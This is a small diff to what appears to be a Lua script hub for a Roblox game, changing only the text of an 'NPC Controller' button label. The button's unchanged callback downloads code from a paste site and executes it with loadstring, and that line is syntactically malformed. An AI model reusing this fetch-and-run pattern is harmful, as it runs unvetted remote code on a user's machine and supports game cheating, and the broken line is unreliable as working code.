@@ -70,6 +70,6 @@ MainSection:NewButton ("Mobile Keyboard", "Gives mobile users a keyboard", funct
 end)
 
 
-MainSection:NewButton("NPC Controller", "Lets you control NPC's.", function()
+MainSection:NewButton("NPC Controller", "Lets you control NPCs.", function()
    loadstring:game:HttpGet("https://controlc.com/04a38455"))()
 end)
